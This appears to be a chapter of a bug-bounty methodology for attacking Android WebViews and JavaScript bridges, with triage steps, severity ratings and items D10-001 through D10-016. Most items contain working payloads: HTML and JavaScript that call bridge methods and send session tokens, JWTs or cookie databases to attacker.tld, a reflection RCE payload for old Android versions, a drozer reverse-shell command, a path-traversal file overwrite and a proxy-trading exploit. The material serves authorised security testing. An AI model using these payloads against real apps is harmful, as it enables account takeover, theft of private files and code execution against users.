# D10 · WebView & JavaScript Bridges

> The WebView is the largest attack surface in the Android ecosystem and the one that most reliably
> converts a remote link into code running in the app's UID. Its ceiling is genuinely P1 — a JS bridge
> method that returns the live session token, reached from attacker HTML, is account takeover, not a
> mobile misconfiguration; and universal file access, `loadDataWithBaseURL` UXSS, a `shouldInterceptRequest`
> traversal or the `minSdk<17` reflection escape each reach RCE-class or full-sandbox-read impact.
> The trap is the opposite: dozens of the sub-checks here (mixed content, safe-browsing off, address-bar
> spoofing) are P5 on their own and pay nothing unless you carry them to a bridge, a token or the app's
> web session.

| | |
|---|---|
| **Phases** | P3 WebView inventory, P4 static (settings + bridge + validator), P5 IPC/deep-link exercise and dynamic bridge reachability |
| **Milestones** | M3, M4, M5 |
| **VRT ceiling** | `server_side_injection.remote_code_execution_rce` (P1) for a bridge→`Runtime.exec`/file-write→code-load chain or the `minSdk<17` reflection escape; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) and `broken_authentication_and_session_management.authentication_bypass` (P1) for a bridge/UXSS/file-read that lifts a live session token → ATO; `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) for cross-user WebView XSS. The mobile-branch fallbacks (`mobile_security_misconfiguration.*`) are **P5** — never file the sub-checks there as findings |
| **Primary attacker model** | AM-02 remote one-click (deep link / open redirect → attacker origin in a bridged WebView); AM-06/AM-07 network attacker for the TLS/mixed-content/MitM-injection variants; AM-03 zero-permission local app for the file-chooser, symlink and localhost-rebinding variants; AM-09 malicious backend/CDN for the remote-asset variants |
| **Maps to** | MASVS-PLATFORM-2, MASVS-CODE-4, MASVS-NETWORK-1, MASVS-STORAGE-1/2; MASTG-TEST-0334, -0250, -0251, -0252, -0253, -0398, -0400, -0399, -0284, -0320, -0227 (LEGACY-IDs -0033/-0027/-0032), MASWE-0033, -0034, -0035, -0027, -0063, -0001, MASTG-KNOW-0018, MASTG-TECH-0043/-0044/-0045/-0142/-0143, MASTG-DEMO-0030/-0082/-0158; CWE-749, CWE-79, CWE-95, CWE-22, CWE-200, CWE-295, CWE-319, CWE-601, CWE-669, CWE-829, CWE-927, CWE-929, CWE-489, CWE-312; ATT&CK T1407, T1456, T1635, T1658, T1638, T1521.003, T1409, T1533 |

## Why this domain pays

Three bodies buy this class by name and the base rate is high. Google's App Security Improvement
programme has run WebView campaigns since 2015: *Webview SSLErrorHandler* (2015-07-17, `answer/7071387`),
*File-based Cross-Site Scripting* (2018-06-05, `answer/7668153`), *JavaScript Interface Injection*
(2018-12-04, `answer/9095419`) and *Cross App Scripting* (2018-10-30, `answer/9084685`) — Google itself
measures each base rate as high enough for a store-wide remediation deadline, and FireEye's *JS-Binding-Over-HTTP*
research found "at least 47% of the top 40 ad libraries" carried the interface bug in an actively-used version.
On HackerOne the paid shapes are dense: TikTok #1065500 (**Critical 9.6**, WebView chain to RCE), #2417516
(High 8.1, **CVE-2024-45240**), LinkedIn #3475626 (High 8.1, static header map leaking cookies), Twitter
#906433 (High 8.1, **CVE-2020-6506** UXSS), Grab #401793 (High 7.1, `getGrabUser` bridge), Basecamp #1343300
(High 7.7), Exness #532836 (`loadDataWithBaseURL` cookie theft), Amazon (`LocalAssetHandler` traversal),
KuCoin (`HybridJsInterface.prompt` trading-as-the-victim, CVSS 4.3 as filed).

The honest split: about a third of the sub-checks in this chapter are P5 ceilings — mixed content, safe
browsing, address-bar spoofing, storage residue. They are written here with an **Escalation** field because
they are chain fuel, not findings. The rule that separates a real report from a downgrade is: **rate the
bridge by what its methods RETURN, and the WebView by whether attacker content can reach it.** A bridge that
returns a GAID is Low; the same bridge shape returning the live `Authorization` header is ATO, and the
delta is one method body you must read. Never file "the app uses `addJavascriptInterface`" — that is not a
finding, the reachable token-returning method is.

Two disciplines carry across every item. **Evidence hygiene:** the strongest proof of a WebView finding is
not an `alert(1)` — it is the exfiltrated value landing on your server, and the request that carries it will
have a `; wv` User-Agent marker, the target package in `X-Requested-With`, and the expected first-party
`Referer`. Show those three and the triager cannot argue you ran it in a normal browser. Capture the
five-screenshot state-change set (pre-state, the injected call, the negative control blocked by CORS, the
positive exfil, the server-side side effect) and keep timestamped pre-patch evidence — vendors patch WebView
config mid-engagement, and a confirmed finding that stopped reproducing is not retracted. **Marker discipline
for reflected XSS:** use an 8+ char random marker and grep the *baseline* response for it first; a WebView
that echoes a value it was already going to render is not injection.

The last honest caveat is version drift. Almost every setting here has a per-API default that flipped, and
several key on `targetSdkVersion`, not `minSdkVersion`. Read the live setting off the concrete object
(D10-001) rather than assuming; state the app's `targetSdk` in the finding; and never write "insecure by
default" against a modern target — that phrasing is how a Critical gets closed for free.

## The crux question

**Can attacker-influenced content — a deep-link `url=`, an open redirect on the allowed origin, a
third-party iframe, a MitM'd subresource, a stored profile field, a malicious `content://` — end up
executing JavaScript inside a WebView that also carries a JS bridge, the app's session cookies, file/content
access, or a real web origin; and if so, what is the single most sensitive thing that reachable context can
read or do?**

## Triage order

1. **Inventory and audit on the concrete class** (D10-001). Read every WebView's live settings off
   `ContentSettingsAdapter` via `Java.choose` — grepping the abstract `WebSettings` records nothing and is
   the single biggest false-negative generator in this domain.
2. **Find the one validator that gates both loads and bridge attach** (D10-002). This class decides the whole
   surface; everything downstream is either "break it" or "find the sibling that skips it".
3. **Enumerate every `@JavascriptInterface` method and rate by return** (D10-003, D10-004). The bridge→capability
   table is the finding's severity, decided by reading method bodies, not by counting bridges.
4. **Get your origin in** (D10-016 → D10-021). Break the allow-list, or find the order-of-checks/sibling/scheme
   gap. No delivery path means the bridge is unreachable and the report is Informational.
5. **The residual four when the parser is strong** (D10-006 → D10-009): cross-origin iframe, unguarded sibling
   path, un-re-checked bridge variant, `getUrl()`-based guard. These are where a well-built app still bleeds.
6. **The file/UXSS Criticals** (D10-022, D10-024, D10-031, D10-034, D10-037). Each is a self-contained
   sandbox-read or same-origin session theft; prove them with the exfil, not the alert.
7. **The framework fast-paths** (D10-055 → D10-062). If the app is Capacitor/Cordova/RN, the bridge is a full
   native API by design — the local server and plugin dispatcher are higher-yield than any hand-written bridge.
8. **TLS/network** (D10-039 → D10-041). `onReceivedSslError→proceed()` is the one "TLS" finding that is NOT
   downgraded to a pinning complaint — demonstrate with an untrusted CA and no device-installed cert.
9. **Storage, cookies, debugging, defence-in-depth** (D10-042 → D10-053) last: mostly chain fuel and P5
   ceilings; write them with an Escalation or move them to the Graveyard.

## Items

### D10-001 · Map every WebView and audit its WebSettings on the concrete class, not the abstract one

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; the reachable misconfiguration it uncovers is the finding) |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0251, MASTG-TEST-0253, MASTG-TECH-0043/-0044/-0045, MASTG-DEMO-0030, `com.android.webview.chromium.ContentSettingsAdapter` |

- **Test:** Locate every WebView activity/fragment, every custom `WebView` subclass, every framework WebView
  (`RNCWebView`, Capacitor `Bridge`, Cordova `SystemWebView`), and read the *effective* settings off each live
  instance. Grep alone is a false-negative generator — settings applied by an obfuscated SDK, a builder helper
  or a framework never match a setter grep.
- **How:**
  ```bash
  grep -rn "extends WebView\|new WebView(\|setWebViewClient(\|WebViewClient()" jadx_out/sources | sort -u
  grep -rnE "setJavaScriptEnabled|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|setAllowContentAccess|setDomStorageEnabled|setMixedContentMode|setSafeBrowsingEnabled" jadx_out/sources
  ```
  `android.webkit.WebSettings` is **abstract** — hooking it fires zero times. Read the live object instead
  (MASTG-DEMO-0030's script):
  ```javascript
  Java.perform(function () {
    Java.scheduleOnMainThread(function () { Java.perform(function () {
      Java.choose('android.webkit.WebView', { onMatch: function (wv) {
        var s = wv.getSettings();
        console.log('WebView '+wv.$className+' url='+wv.getUrl()+' settingsImpl='+s.$className);
        console.log('  js='+s.getJavaScriptEnabled()+' file='+s.getAllowFileAccess()
          +' fileFromFile='+s.getAllowFileAccessFromFileURLs()
          +' universal='+s.getAllowUniversalAccessFromFileURLs()
          +' content='+s.getAllowContentAccess()+' mixed='+s.getMixedContentMode()
          +' safeBrowsing='+s.getSafeBrowsingEnabled()+' dom='+s.getDomStorageEnabled());
      }, onComplete: function () {} });
    }); });
  });
  ```
  objection equivalent: `android heap search instances android.webkit.WebView` → `android heap execute <hash> getUrl --return-string`.
- **Proof:** A per-instance settings table where `settingsImpl` prints a concrete class name (e.g.
  `com.android.webview.chromium.ContentSettingsAdapter`) alongside the boolean values, plus a backtrace naming
  the owning class. A zero from a base-class hook is a FALSE NEGATIVE, not a negative result.
- **Escalation:** Feeds every other item — a live `true` on `setAllowUniversalAccessFromFileURLs` is the file-exfil
  primitive (D10-031), a bridge in the dump is D10-004.
- **Ruled out when:** `Java.choose` returns instances and every one shows `js=false`, or the only WebViews found
  load a single pinned first-party URL with no bridge, no file access and no cookies — and you re-ran after
  exercising the UI (an empty `Java.choose` means "no live instance right now", never "no WebView").

### D10-002 · Locate the single URL/origin validator that gates both loads and bridge attach

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-02 |
| **Applies to** | all WebView apps |
| **Maps to** | `risks/unsafe-uri-loading`; local corpus "Map the WebView layer first" |

- **Test:** One class usually decides the security of the whole surface: the URL/allow-list validator that both
  authorises a load and authorises bridge attachment. Name it, name its two methods (authorise-load,
  authorise-bridge), and list every call site of each — the finding is almost always an *unguarded sibling*
  call site, not a parser bypass.
- **How:**
  ```bash
  grep -rn "loadUrl(\|loadDataWithBaseURL(\|addJavascriptInterface(\|prefetch\|preload\|warmup" jadx_out/sources | sort -u
  # diff the validator's call sites against every load/attach site
  ```
  Worked shape (Meesho): validator `C19575i` with `m34172a(url,true)`=authorise-attach, `m34173b(...)`=authorise-load,
  routed through the custom `MyWebView`; the residual bugs were the raw prefetcher and a bridge variant with no gate.
- **Proof:** You can name the validator class/method and enumerate every call site of each, marking which loads and
  which bridge attaches route through it and which do not.
- **Escalation:** Feeds D10-006 through D10-009 (the four residual patterns) and D10-016 (breaking the validator).
- **Ruled out when:** every `loadUrl`/`loadDataWithBaseURL`/`addJavascriptInterface` call site provably routes
  through the same validator, which does exact scheme+host set-membership (D10-016), and no raw/prefetch/SDK WebView
  bypasses it.

### D10-003 · Enumerate every `@JavascriptInterface` method and build the bridge→capability table rated by return

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; the reachable sensitive method is the finding) |
| **Attacker** | AM-02 |
| **Applies to** | all apps with `addJavascriptInterface` |
| **Maps to** | MASTG-TEST-0334, MASWE-0033 (CWE-749), MASTG-TECH-0043; `risks/insecure-webview-native-bridges` |

- **Test:** Do not stop at "a bridge exists". Read every annotated method body and classify each by what it
  reaches: token getter, file I/O, network/proxy, intent launch, `Runtime.exec`, native. The severity ceiling of
  the whole domain is the most sensitive reachable capability.
- **How:**
  ```bash
  S=jadx_out/sources
  grep -rl "@JavascriptInterface" $S ; grep -rn "addJavascriptInterface(" $S           # bridge name = 2nd arg
  grep -rn -A20 '@JavascriptInterface' $S | grep -nE 'return|getHeader|token|cookie|Authorization|readFile|exec|openUrl'
  grep -rn 'Interceptor|addHeader|Request.Builder' $S | grep -iE 'token|auth|session'  # the header factory
  ```
  Runtime enumeration (works on obfuscated builds):
  ```javascript
  Java.perform(function () {
    var WV = Java.use('android.webkit.WebView');
    WV.addJavascriptInterface.overload('java.lang.Object','java.lang.String').implementation = function (o, n) {
      console.log('[bridge] name='+n+' class='+o.$className);
      Java.use(o.$className).class.getDeclaredMethods().forEach(function (m) { console.log('   '+m.toString()); });
      return this.addJavascriptInterface(o, n);
    };
  });
  ```
  Tabulate: `getParams`/`refreshXo`→auth headers, `getUxCamSessionUrl`→session-replay URL, `saveFile/fetchAll`→file
  store, `openExternalApp`→intent, `resourceDownload`→path-traversal write, `initiateTxn`→payments.
- **Proof:** The method inventory with each method's return value traced to source; the pairing that matters most is
  a token-returning method plus the OkHttp interceptor that authenticates requests with the *same* header — that
  proves the returned value is a live credential (Meesho `xoox.getParams()` returned `Xo`, the header the
  interceptor authenticates with).
- **Escalation:** A token getter → D10-004 → D13/D15 ATO; a file/exec method → D11/D17.
- **Ruled out when:** every annotated method returns only non-sensitive data (a GAID, a static app version, a UI
  no-op) and none touches files, network, credentials or native code — and you verified this by reading the bodies,
  not by assuming from names.

### D10-004 · JS bridge method reachable from attacker-controlled content returns a live credential → ATO

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all apps with `addJavascriptInterface` + a delivery path (D10-016+) |
| **Maps to** | MASTG-TEST-0334, MASWE-0033, ATT&CK T1407/T1635; H1 #401793, #1343300, #1500614, #189793; CWE-929 |

- **Test:** With a reachable token-returning method (D10-003) and a way to load attacker content (D10-016+), call
  the method from a page you control and exfiltrate the return. JS interfaces have **no origin policy** — the payoff
  of every D09 finding.
- **How:** Get your origin loaded (deep-link `url=`, open redirect, iframe, MitM), then:
  ```html
  <script>
   for (var k in window.NativeBridge) document.title += k+' ';   // enumerate
   new Image().src = 'https://attacker.tld/x?d='+encodeURIComponent(NativeBridge.getAuthToken());
  </script>
  ```
  Grab #401793's verbatim payload: `if (window.Android) data = window.Android.getGrabUser();`. Basecamp #1343300:
  `window.location.replace("https://attacker?e="+nativeBridge.getPage().accountName)`.
- **Proof:** Your server log line containing the real token/PII, with the request carrying a `; wv` User-Agent, the
  target package in `X-Requested-With` and a first-party `Referer` — plus the Frida enumeration naming the interface
  and method. Then replay the token against the API (D15) to confirm it authenticates; the mobile app's hardcoded
  backend is often an older API version with weaker controls, so diff its behaviour, not just its shape.
- **Escalation:** → D13 session theft → D15 authenticated API abuse as the victim.
- **Ruled out when:** no reachable method returns a credential (D10-003 negative), OR the bridge is only ever
  attached to a WebView that loads a single pinned first-party URL and no delivery path (D10-016 through D10-021)
  puts attacker content into it, and cross-origin iframes cannot reach it (D10-006).

### D10-005 · `minSdk<17` `addJavascriptInterface` reflection RCE

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-02 (with cleartext/MitM or a reachable origin) |
| **Applies to** | LEGACY — `minSdkVersion < 17` only |
| **Maps to** | CVE-2012-6636, CVE-2013-4710, CVE-2014-0514, CVE-2014-4968; drozer `exploit.remote.webview.addjavascriptinterface`; EDB 42288/34088/32884/41675/31519 |

- **Test:** Below API 17 an injected object exposes **all public methods** including those inherited from `Object`,
  so JS reaches `getClass().forName("java.lang.Runtime")` → `exec`. Verify the API floor *first* — this is a
  credibility-killer to report against a modern build.
- **How:**
  ```bash
  aapt2 dump badging target.apk | grep -E 'sdkVersion|targetSdkVersion'
  grep -rn 'addJavascriptInterface(' jadx_out/sources ; grep -rn '@JavascriptInterface' jadx_out/sources | wc -l  # 0 annotations + low floor
  ```
  Payload (EDB 42288/34088 shape):
  ```html
  <script>
  for (var n in window) { try {
    window[n].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null)
      .invoke(null,null).exec(['/system/bin/sh','-c','id > /data/data/com.target/owned']);
  } catch(e){} }</script>
  ```
  Or drozer: `drozer exploit build exploit.remote.webview.addjavascriptinterface --payload weasel.shell.armeabi --server <ip>`.
- **Proof:** `adb shell run-as com.target cat owned` returns your marker, or a reverse shell whose `id` shows the
  app's `u0_aNN` UID. The three drozer preconditions: JS interface defined; WebView loads cleartext or has an SSL
  flaw; the interface-bearing component compiled with target API < 17.
- **Escalation:** RCE as the app → full data directory, Keystore *use* (D12), session theft (D13). Note a **bundled
  SDK** compiled against a sub-17 target keeps this alive even when the app itself targets high.
- **Ruled out when:** `minSdkVersion ≥ 17` and no bundled interface-bearing component is compiled with target < 17 —
  then only `@JavascriptInterface`-annotated methods are reachable and this variant fails; pivot to D10-004.

### D10-006 · Bridge injected into every frame → cross-origin iframe reaches it (main-frame-only enforcement)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 / AM-09 |
| **Applies to** | all WebViews with `addJavascriptInterface` |
| **Maps to** | MASTG-TEST-0334 ("`WebView.getUrl()` is not a reliable way to determine which frame invoked"); `risks/insecure-webview-native-bridges` ("injected into every frame, including iframes") |

- **Test:** `addJavascriptInterface` injects the object into **every frame**, but nav/bridge gates commonly run only
  under `if (request.isForMainFrame())`, and per-call guards read `webView.getUrl()` (the *main-frame* URL). A
  cross-origin iframe on an allow-listed page therefore executes with the bridge while the main-frame guard passes.
- **How:**
  ```bash
  grep -rn 'isForMainFrame\|shouldInterceptRequest\|shouldOverrideUrlLoading' jadx_out/sources -A6
  # for each bridge method, check whether its guard reads webView.getUrl() rather than the calling frame's origin
  ```
  Host on an allow-listed origin (or an origin the app loads, or via a vendor open redirect):
  `<iframe src="https://attacker.tld/reach-bridge.html"></iframe>` and call the sensitive method from inside the iframe.
- **Proof:** The bridge method executes and returns its value to the iframe's JS context, exfiltrated to your server.
  This was "the crown bug of the Meesho run".
- **Escalation:** Pair with a vendor-side open redirect or an embeddable feature to satisfy the precondition; token → D13.
- **Ruled out when:** the gate enforces on the calling frame's origin (e.g. `WebViewCompat.addWebMessageListener`
  with an allowed-origin list, or a per-call check that reads the source origin, not `getUrl()`), and cross-origin
  iframes are blocked from loading on bridged pages.

### D10-007 · The same bridge is registered twice and only one variant re-checks origin

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all; always diff variants |
| **Maps to** | local corpus residual pattern 3 (Meesho checkout `xoox` `C14497h` re-checks; BNPL `xoox` `C1535g` has no gate) |

- **Test:** Apps ship several bridge objects (checkout, BNPL, rewards) under the same or similar JS-visible names.
  One has a per-call origin gate; another has none. Diff them.
- **How:**
  ```bash
  grep -rn 'addJavascriptInterface(' jadx_out/sources           # list every class registering each JS name
  # for each variant, check for an origin/permission check at the TOP of the method body, not just at attach time
  ```
- **Proof:** A side-by-side of two variants — one with the gate, one without — plus a call to the unguarded variant
  from a non-allow-listed origin returning the sensitive value. The side-by-side also proves it is a defect, not a
  design decision.
- **Escalation:** The least-guarded variant becomes the exploitation path → D10-004 → D13.
- **Ruled out when:** every registered variant of the bridge carries the same per-call origin gate, verified by
  reading each class's method bodies.

### D10-008 · Unvalidated sibling load path (prefetcher, raw WebView, third-party SDK WebView)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `unvalidated_redirects_and_forwards.open_redirect.get_based` (P4) floor; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the sibling also attaches a bridge/headers |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | local corpus residual pattern 1/2 (Meesho `Profile.prefetchUrl`, raw `WebView` `C14505l`) |

- **Test:** A *different* code path loads the same URL without the allow-list, or a raw (non-custom) `WebView`
  instance skips the validator entirely. Prefetch/warmup paths fire on the raw deep-link URL *before* validation.
- **How:**
  ```bash
  grep -rn 'new WebView(\|extends WebView\|WebViewClient()\|prefetch\|preload\|warmup' jadx_out/sources | sort -u
  # diff every load site against the validator's call sites from D10-002
  ```
- **Proof:** `logcat` shows `prefetch failed for https://attacker…` — a forced GET to an attacker host from the
  victim app; or the raw WebView renders your origin. If the sibling attaches a bridge or `Authorization`/`Cookie`
  headers, capture those on Collaborator.
- **Escalation:** A bridged sibling path = full allow-list bypass (D10-004); a blind forced GET = SSRF-lite → D15/D22.
- **Ruled out when:** every load site — prefetch and raw included — routes through the validator (D10-002), and no
  bundled SDK WebView loads attacker-influenced URLs unguarded.

### D10-009 · Per-call origin guard built on `webView.getUrl()` is unreliable

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it gates a token getter |
| **Attacker** | AM-02 |
| **Applies to** | all bridged WebViews |
| **Maps to** | MASTG-TEST-0334 ("`WebView.getUrl()` is not a reliable way to determine which frame invoked the interface") |

- **Test:** A bridge method that authorises itself by reading `webView.getUrl()` is checking the top-level document
  URL, not the caller. That value is stale across an in-flight navigation and wrong for iframes and `window.open`
  children — so origin checks built on it are themselves a finding.
- **How:**
  ```bash
  grep -rn 'getUrl()' jadx_out/sources -B3 -A6 | grep -iE 'JavascriptInterface|allow|trusted|host|origin'
  ```
  Exercise via the iframe path (D10-006), a mid-navigation race, or the child-window path (D10-030).
- **Proof:** The bridge returns its value to a context whose true origin is attacker-controlled while
  `webView.getUrl()` still reads the trusted origin — hook `getUrl()` with Frida to show the divergence.
- **Escalation:** → D10-004/D10-006.
- **Ruled out when:** the guard reads the calling frame's origin (WebMessageListener source origin), not
  `getUrl()`, and the bridge is detached when leaving trusted origins.

### D10-010 · `addWebMessageListener` with a wildcard `allowedOriginRules`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | apps using `androidx.webkit` `WEB_MESSAGE_LISTENER` |
| **Maps to** | `risks/insecure-webview-native-bridges` ("Lack of origin checks on message endpoints"); MASWE-0033 |

- **Test:** The modern replacement for `addJavascriptInterface` is
  `WebViewCompat.addWebMessageListener(webView, jsObjectName, allowedOriginRules, listener)`. Teams migrate to it and
  then pass `setOf("*")` (or `"https://*"`) as the rules, reintroducing the whole bug — any loaded origin, including
  an injected iframe, calls the native object. Reviewers who only grep `addJavascriptInterface` miss this.
- **How:**
  ```bash
  grep -rnE 'addWebMessageListener|allowedOriginRules|addDocumentStartJavaScript' jadx_out/sources -A4
  grep -rn '"\*"' jadx_out/sources | grep -i origin
  ```
  From an unrelated origin loaded into that WebView: `myNativeBridge.postMessage(JSON.stringify({cmd:'getToken'}))`.
- **Proof:** The origin-rule set contains `*`/`https://*`, plus a PoC page on an unrelated origin calling the listener
  and receiving app data back (exfiltrate to your server).
- **Escalation:** Bridge method returning a session token → ATO (D13/D15).
- **Ruled out when:** `allowedOriginRules` is a fixed list of exact first-party HTTPS origins with no wildcard, and
  the listener also validates `sourceOrigin` for privileged actions.

### D10-011 · `postWebMessage` / `WebMessagePort.postMessage` with a `*` target origin

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the channel carries a token |
| **Attacker** | AM-02 |
| **Applies to** | all; frequently missed (scanners only grep `addJavascriptInterface`) |
| **Maps to** | `risks/insecure-webview-native-bridges` ("Avoid using `*` as target origin"; `loadData()` gives a null origin); `WebMessagePort.java` |

- **Test:** A `MessageChannel` bridge posting to `"*"` has no origin binding and accepts messages from any frame,
  including injected iframes. Content loaded via `loadData()` has no valid origin and cannot be messaged securely —
  use `loadDataWithBaseURL` with a real HTTPS base.
- **How:**
  ```bash
  grep -rnE 'postWebMessage|createWebMessageChannel|WebMessagePort|setWebMessageCallback' jadx_out/sources -A6
  grep -rn 'Uri.parse("\*")\|"\*"' jadx_out/sources | grep -i webmessage
  ```
  From an attacker frame: `window.addEventListener('message', e => fetch('https://attacker/?m='+btoa(e.data)))` and
  `port.postMessage(JSON.stringify({cmd:'getToken'}))`.
- **Proof:** Your listener receives the native-originated message (server log with decoded payload), or the native
  callback acts on your injected message (observable side effect / backend request).
- **Escalation:** Same practical impact as a JS bridge → D10-004 → D13.
- **Ruled out when:** the target origin is an explicit `Uri` (not `*`) and the native handler validates the message
  origin.

### D10-012 · Dispatcher-style bridge (`invokeMethod`+`handlerName`) reaching a URI→`File` read

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all apps with a generic JS bridge dispatcher |
| **Maps to** | HackTricks webview-attacks.md ("Abusing dispatcher-style JS bridges", "Arbitrary file read via URI → File sinks"); KuCoin `HybridJsInterface.prompt` |

- **Test:** A single exported method that deserialises attacker JSON and dispatches on a handler name is a generic
  gateway. If any registered handler takes a URI, calls `Uri.parse(req.getUri()).getPath()` and builds `new File(...)`
  without an allow-list, you get arbitrary file read **in native code** — so `setAllowFileAccess(false)` does not stop it.
- **How:** Enumerate handlers (classes implementing `getModuleName()` or the registration map). Then:
  ```javascript
  window.WebViewJavascriptBridge = { _handleMessageFromObjC: function (d) { console.log(d) } };
  xbridge.invokeMethod(JSON.stringify({ handlerName:'toBase64', callbackId:'cb_'+Date.now(),
    data:{ uri:'file:///data/data/<pkg>/app_webview/Default/Cookies' } }));
  ```
  KuCoin's proxy variant issued authenticated trades:
  `window.KuCoin.prompt('{"type":"proxy","params":{"method":"post","url":"v1/trade/order",...},"callbackId":"..."}')`.
- **Proof:** A large Base64 string returned via `evaluateJavascript` decoding to the SQLite cookie DB (whose cookies
  then authenticate as the user); or, for a proxy bridge, the trading/account API returning 200 for an action the
  victim never performed, with the victim's own session.
- **Escalation:** Reaches `shared_prefs`, `databases`, any token file → D11/D13; proxy bridge → D15 authenticated abuse.
- **Ruled out when:** the dispatcher's handlers validate every URI/path against an allow-list and canonicalise before
  `new File`, and no handler performs a network request with the app's session on an attacker-supplied URL.

### D10-013 · JS bridge file-write method with an unvalidated filename → sandbox path traversal

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES); `server_side_injection.remote_code_execution_rce` (P1) only if a code-load path is writable |
| **Attacker** | AM-02 |
| **Applies to** | all bridges accepting `(content, fileName, mimeType)` |
| **Maps to** | Mustafa Mohamed (2026, H1 public program); safe fix `getCacheDir().toPath().toRealPath()` + `startsWith` check |

- **Test:** Bridges that write attacker `content` to `fileName` under cache/files with no canonicalisation let a
  `../` filename escape the intended directory and overwrite app-private files.
- **How:** Deliver via the exported activity that loads your page, then:
  ```html
  <script>
  AndroidInterface.sendFile(btoa("<?xml version='1.0'?><map><string name='pwn'>pwned</string></map>"),
    "../shared_prefs/AAMDataStore.xml", "text/xml");
  </script>
  ```
- **Proof:** `adb shell run-as com.target cat shared_prefs/AAMDataStore.xml` returns the attacker XML; the original
  is gone. Do NOT claim RCE unless you hooked `System.load`/`dlopen`/`DexClassLoader`/`Runtime.exec` with Frida and
  proved a writable path is loaded — Mustafa hooked all of them, found none, and correctly did not claim RCE.
- **Escalation:** Config/state manipulation now; → D17 dynamic code loading only if a loader reads a writable path.
- **Ruled out when:** the write target is canonicalised (`toRealPath`) and prefix-checked against the intended dir,
  and no app-private config the app trusts is overwritable.

### D10-014 · Callback-wrapping to steal a credential-returning bridge result

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | bridges whose token getter delivers async via a JS callback |
| **Maps to** | HackTricks webview-attacks.md ("Callback wrapping to steal credential-returning bridge results"); Fares Walid (SirBugs); Oversecured SmartThings `McsBridge.getAuthInfo()` |

- **Test:** Many bridges return a token asynchronously by invoking a global JS callback (`window.callWebView({action:'refresh_jwt',...})`).
  From a JS foothold you wrap the callback to skim the token without breaking the app.
- **How:**
  ```javascript
  const orig = window.callWebView;
  window.callWebView = function (m) {
    const d = typeof m === 'string' ? JSON.parse(m) : m;
    if (d.action === 'refresh_jwt' && d.payload?.data)
      new Image().src = 'https://attacker/j?t=' + encodeURIComponent(d.payload.data);
    return orig.apply(this, arguments);
  };
  window.Android.postMessage(JSON.stringify({ action:'refresh_jwt', payload:{ old_jwt:'' } }));
  ```
- **Proof:** Your server receives the JWT (confirm the request has a `; wv` UA, the package in `X-Requested-With`,
  first-party `Referer`), and it replays against the API as the victim. `new Image().src` is the reliable exfil —
  it only needs the request issued, not the response readable.
- **Escalation:** → D13/D15 ATO. Test whether the token authenticates the mobile app's (often older, weaker)
  backend version — the weakened control is the finding, not the version difference.
- **Ruled out when:** the token is never delivered to JS (native-only handling), or the WebView cannot be reached by
  attacker content (D10-016+ all negative).

### D10-015 · `removeJavascriptInterface()` not called before loading untrusted content (or called too late)

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | inherits the bridge severity (D10-004) |
| **Attacker** | AM-02 |
| **Applies to** | all bridged WebViews that ever navigate off-origin |
| **Maps to** | `WebView.java` (`removeJavascriptInterface`); local corpus |

- **Test:** The documented mitigation is to remove the interface before loading untrusted content "such as in
  `shouldInterceptRequest()`". The platform caveat: removal "is not reflected in JavaScript until the page is next
  (re)loaded" — so removal *after* navigation begins does not protect the already-loaded document.
- **How:**
  ```bash
  grep -rn 'removeJavascriptInterface' jadx_out/sources -B10 -A5   # confirm ordering vs loadUrl / navigation
  ```
- **Proof:** Navigate the WebView off-origin and show `typeof window.<bridge> !== 'undefined'` rendered into the page
  and screenshotted.
- **Escalation:** Reinstates D10-004 on the off-origin document.
- **Ruled out when:** the interface is removed *before* the load begins and the page is reloaded, or the bridge is
  never present when off-origin content can be reached.

### D10-016 · Break the URL allow-list validator

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the bypassed WebView carries a bridge/auth headers |
| **Attacker** | AM-02 |
| **Applies to** | all; backslash-authority variant is API ≤ 24 (LEGACY) |
| **Maps to** | local corpus Class #16; Oversecured WebView checklist; `HierarchicalUri` reflection variant |

